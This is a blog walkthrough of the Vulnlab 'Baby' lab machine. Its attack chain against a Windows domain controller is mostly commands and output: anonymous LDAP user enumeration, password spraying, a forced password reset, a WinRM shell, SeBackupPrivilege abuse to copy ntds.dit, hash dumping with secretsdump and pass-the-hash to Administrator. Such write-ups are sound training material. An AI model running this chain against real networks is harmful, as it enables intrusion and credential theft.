---
layout: post
title: Vulnlab - Baby Walkthrough
---

## A writeup of Baby from Vulnlab

[<img src="../images/baby/vulnlab_baby.png"
  style="width: 800px;"/>](../images/baby/vulnlab_baby.png)

I have always heard good things about Vulnlab and I have always wanted to try some of the machines available.  This month I finally got myself a subscription and gave Baby, an easy Windows Machine a go.  This is the writeup for this machine. 


## Nmap

Lets run a nmap scan to discover what ports are open and what services are running on them:

```bash
nmap -sC -sV 10.10.111.218 -oA nmap/baby
```
- -sC for all scripts
- -sV for version and service detection
- -oA to output all formats and save them in the nmap directory with the name baby

The output:

```bash
Nmap scan report for 10.10.111.218
Host is up, received echo-reply ttl 127 (0.040s latency).
Scanned at 2025-05-14 22:29:57 BST for 59s
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-14 21:30:08Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Information gathering

From the nmap scan results we can see the domain is `baby.lv`.  Also with the services running on the box it looks like a domain controller and this can also be seen as the hostname `BABYDC`.  So lets add those to our `/etc/hosts` file:

```bash
sudo vim /etc/hosts

10.10.111.218   baby.lv babydc babydc.baby.lv
```

Apart from this we don't have much else to go on.  So lets see if we can discover some valid user accounts on the domain.  We can use a tool like netexec to do this enumeration.  Lets check if we can get any information via a null session:

```bash
netexec ldap 10.10.111.218 -u '' -p ''
LDAP        10.10.111.218   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.111.218   389    BABYDC           [+] baby.vl\: 

```

It looks like we didn't get any errors back when querying the ldap service.  Lets see if we can get some users now by using `--users`.

```bash
netexec ldap 10.10.111.218 -u '' -p '' --users
LDAP        10.10.111.218   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.111.218   389    BABYDC           [+] baby.vl\: 
LDAP        10.10.111.218   389    BABYDC           [*] Enumerated 10 domain users: baby.vl
LDAP        10.10.111.218   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.111.218   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.111.218   389    BABYDC           Jacqueline.Barnett            2021-11-21 15:11:03 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Ashley.Webb                   2021-11-21 15:11:03 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Hugh.George                   2021-11-21 15:11:03 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Leonard.Dyer                  2021-11-21 15:11:03 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Connor.Wilkinson              2021-11-21 15:11:08 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Joseph.Hughes                 2021-11-21 15:11:08 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Kerry.Wilson                  2021-11-21 15:11:08 0                                                                    
LDAP        10.10.111.218   389    BABYDC           Teresa.Bell                   2021-11-21 15:14:37 0        Set initial password to BabyStart123!                       
LDAP        10.10.111.218   389    BABYDC           Caroline.Robinson             <never>             0  
```

Nice, we now have a list of user accounts.  What is also interesting is we can see a comment on the user account `Teresa.Bell` `Set initial password to BabyStart123!`.

So we have a list of usernames and a password which was set at one point for the user `Teresa.Bell`.  Lets try it:

```bash
netexec ldap 10.10.111.218 -u 'Teresa.Bell' -p 'BabyStart123!'          
LDAP        10.10.111.218     389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
```

Hmmmm no luck.  Perhaps this was a password which is set for all new accounts, as administrators can be lazy and one of those other users have not changed the default password.  

## Password spraying

Lets see if we can get just the usernames from the above output with the following command:

```bash
netexec ldap 10.10.111.218 -u '' -p '' --users | awk '{print $5}'
[*]
[+]
[*]
-Username-
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```

Lets take the usernames and save them in `users.txt`.

Now we have a list of usernames and a potential password we can do a quick password spray using netexec:

```bash
netexec ldap 10.10.111.218 -u users.txt -p 'BabyStart123!' --continue-on-success
LDAP        10.10.111.218     389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.10.111.218     389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

Interesting, `Caroline.Robinson` gave us a response `STATUS_PASSWORD_MUST_CHANGE`.  

A quick google returns this page [https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/#brute-force-credentials](https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/#brute-force-credentials).  So using the tool smbpasswd we can set a new password for the user.

```bash
smbpasswd -r 10.10.111.218 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

Now lets try the new secure password I set for Caroline.Robinson:

```bash
netexec ldap 10.10.111.218 -u 'Caroline.Robinson' -p 'Password123!'
LDAP        10.10.111.218     389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.111.218     389    BABYDC           [+] baby.vl\Caroline.Robinson:Password123! (Pwn3d!)
```

## Winrm here we come

We noticed when looking at the nmap output that winrm was available on the box:

```bash
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```
Lets see if we can use winrm as Caroline.Robinson

```bash
netexec winrm 10.10.111.218 -u 'Caroline.Robinson' -p 'Password123!'
WINRM       10.10.111.218     5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) 
WINRM       10.10.111.218     5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123! (Pwn3d!)
```

Nice, we are in luck.  Lets use the tool evil-winrm to get a foothold on the machine:

```bash
evil-winrm -i 10.10.111.218 -u Caroline.Robinson -p Password123!                              
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 

```

## User

From here we can now head into Carolines Desktop directory and get the user flag:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> dir


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        11/21/2021   3:24 PM             36 user.txt

```

## Privilege Escalation

Lets see what privileges Caroline has.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

What is interesting to us is `BUILTIN\Backup Operators` and `SeBackupPrivilege`.  With these privileges, we will be able to backup and read files that we normally would not be able to access.  Allowing us to read sensitive and confidential files.  

There are 2 ways we can get the root flag required to complete this box.  1 way is useful for getting the flag in the context of a CTF/vulnerable machine challenge.  The other way is more realistic.  Lets explore them both.  

## Backup root.txt

There is a useful exploit which can be found here [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege).  With this we will be able to backup the root.txt file from the directory `C:\Administrator\Desktop\root.txt` to somewhere we can read it.  

First lets download the relevant files required to our local machine.

```bash
wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true
wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true
```

Now we can upload these easily through evil-winrm.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> upload www/SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /home/kali/Documents/vulnlab/baby/www/SeBackupPrivilegeCmdLets.dll to C:\Users\Caroline.Robinson\Desktop\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> upload www/SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /home/kali/Documents/vulnlab/baby/www/SeBackupPrivilegeUtils.dll to C:\Users\Caroline.Robinson\Desktop\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!

```

We now need to import the modules into our powershell session.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Now we can just backup the root.txt file to our Desktop and read the flag.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Copy-FileSeBackupPrivilege /Users/Administrator/Desktop/root.txt root.txt
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> dir

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> more root.txt
<REDACTED>
```

Lets now explore the more realistic approach and get direct access as Administrator. 

## ntds.dit give me your secrets

We are going to use a combination of the tools `diskshadow` and `robocopy` to get a copy of the `ntds.dit` file from the Windows environment.  First of all on our local machine, lets create a backup.txt file containing the following.

```bash
set verbose on   
set metadata C:\Windows\Temp\meta.cab   
set context clientaccessible   
set context persistent   
begin backup   
add volume C: alias cdrive   
create   
expose %cdrive% E:   
end backup
```

And then upload it to the Windows box.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload backup.txt
                                        
Info: Uploading /home/kali/Documents/vulnlab/baby/www/backup.txt to C:\Users\Caroline.Robinson\Documents\backup.txt
                                        
Data: 252 bytes of 252 bytes copied
                                        
Info: Upload successful!
```

Now lets use diskshadow to take a shadow copy of the ntds.dit file and store it on a network drive `E:`. 

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> diskshadow /s backup.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  5/16/2025 10:53:12 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters

* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files

* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds

* Including writer "ASR Writer":
        + Adding component: \ASR\ASR
        + Adding component: \Volumes\Volume{1b77e212-0000-0000-0000-100000000000}
        + Adding component: \Disks\harddisk0
        + Adding component: \BCD\BCD

* Including writer "WMI Writer":
        + Adding component: \WMI

* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB

* Including writer "Registry Writer":
        + Adding component: \Registry

Alias cdrive for shadow ID {7079f7ea-3fc4-46dc-a37c-fa66da3cba89} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {ebd0bb10-857e-4d4c-932d-1d5239d448b5} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file DisC5D6.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {ebd0bb10-857e-4d4c-932d-1d5239d448b5}

        * Shadow copy ID = {7079f7ea-3fc4-46dc-a37c-fa66da3cba89}               %cdrive%
                - Shadow copy set: {ebd0bb10-857e-4d4c-932d-1d5239d448b5}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 5/16/2025 10:53:26 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {7079f7ea-3fc4-46dc-a37c-fa66da3cba89}
The shadow copy was successfully exposed as E:\.
-> end backu

END { BACKUP | RESTORE }

        BACKUP                  Ends a full backup operation.
        RESTORE                 Ends a restore operation.
Note: END BACKUP was not commanded, writers not notified BackupComplete.
DiskShadow is exiting.
```

Now we have created a shadow copy of the ntds.dit file we can then extract this from the network drive with robocopy.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, May 16, 2025 10:55:33 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Users\Caroline.Robinson\Desktop\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%
  1.9%
  2.3%
  2.7%
  3.1%
  3.5%
  3.9%
<SNIP>
 98.8%
 99.2%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           98,112,374 Bytes/sec.
   Speed :            5,614.035 MegaBytes/min.
   Ended : Friday, May 16, 2025 10:55:33 PM
```

We now have a copy of the ntds.dit file in our user directory.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cd ntds
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop\ntds> dir


    Directory: C:\Users\Caroline.Robinson\Desktop\ntds


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/16/2025  10:53 PM       16777216 ntds.dit

```

What we can do now is download this to our local machine.  

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop\ntds> download ntds.dit
                                        
Info: Downloading C:\Users\Caroline.Robinson\Desktop\ntds\ntds.dit to ntds.dit
                                        
Info: Download successful!
```

We are going to use a tool called `secretsdump.py` to extract all of secrets and hashes of users on the box.  We have one part of the puzzle that we need, the ntds.dit file.  But we also need one more thing, a decryption key.  Lets get that with the following command.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.
```

And download it to our machine as well.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop\ntds> download SYSTEM.sav
                                        
Info: Downloading C:\Users\Caroline.Robinson\Desktop\ntds\SYSTEM.sav to SYSTEM.sav
                                        
Info: Download successful!
```

## secretsdump.py

We have all we need to dump all the hashes.

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.sav -hashes lmhash:nthash LOCAL 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:25ab9daf2bb839c3d8852f412e412d38:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

## Winrm as Administrator

With the NTLM hash for the administrator we can now login via winrm.  Usually we would need a valid username and password combination, but what we can do instead is the use the hash to `pass-the-hash`.  If we look at the help menu for evil-winrm we can see the `-H` flag.

```bash
evil-winrm -h                                                                               
                                        
Evil-WinRM shell v3.7

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
                                                               
```

So looking at the Administrator hash dumped.  We want the last section of the hash.

Dumped hash:
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::`

Section we need to pass-the-hash:
`ee4457ae59f1e3fbd764e33d9cef123d`

Lets connect to the box as Administrator via evil-winrm.

```bash
evil-winrm -i 10.10.111.218 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And there we have it, we are now Administrator on the box and we can read the flag from the Administrators Desktop. 

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
<REDACTED>

*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

## Conclusion
This was the first machine I completed on vulnlab and I really enjoyed it.  It was relatively straight forward but I learnt some new tricks along the way (the smbpasswd was new to me).  

Thank you for taking the time to read this and I will be posting more writeups in the near future. 